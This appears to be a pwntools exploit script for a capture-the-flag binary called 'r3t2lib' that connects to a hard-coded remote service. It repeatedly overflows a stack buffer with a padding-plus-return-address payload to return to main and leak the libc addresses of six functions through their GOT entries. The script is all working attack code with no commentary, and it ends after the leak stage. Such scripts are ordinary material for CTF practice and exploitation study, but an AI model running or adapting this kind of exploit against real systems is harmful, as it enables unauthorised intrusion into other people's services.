from pwn import *

puts_plt = 0x601018
printf_plt = 0x601020
read_plt = 0x601028
gets_plt = 0x601040
fflush_plt = 0x601048
strtoll_plt = 0x601038
pop_rdi = 0x400843
ret = 0x400539
main = 0x4006f6
see_something = 0x4006c6

r = remote('140.110.112.77', 2123)
#r = process('r3t2lib')
raw_input('debug')
r.recvuntil('hex) :')
r.sendline(hex(puts_plt))
puts_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('puts_libc: ', hex(puts_libc))

r.sendline('a' * 0x118 + p64(ret) + p64(main))
r.recvuntil('hex) :')
r.sendline(hex(printf_plt))
printf_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('printf_libc: ', hex(printf_libc))

r.sendline('a' * 0x118 + p64(ret) + p64(main))
r.recvuntil('hex) :')
r.sendline(hex(gets_plt))
gets_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('gets_libc: ', hex(gets_libc))

r.sendline('a' * 0x118 + p64(ret) + p64(main))
r.recvuntil('hex) :')
r.sendline(hex(read_plt))
read_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('read_libc: ', hex(read_libc))

r.sendline('a' * 0x118 + p64(ret) + p64(main))
r.recvuntil('hex) :')
r.sendline(hex(fflush_plt))
fflush_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('fflush_libc: ', hex(fflush_libc))

r.sendline('a' * 0x118 + p64(ret) + p64(main))
r.recvuntil('hex) :')
r.sendline(hex(strtoll_plt))
strtoll_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('strtoll_libc: ', hex(strtoll_libc))
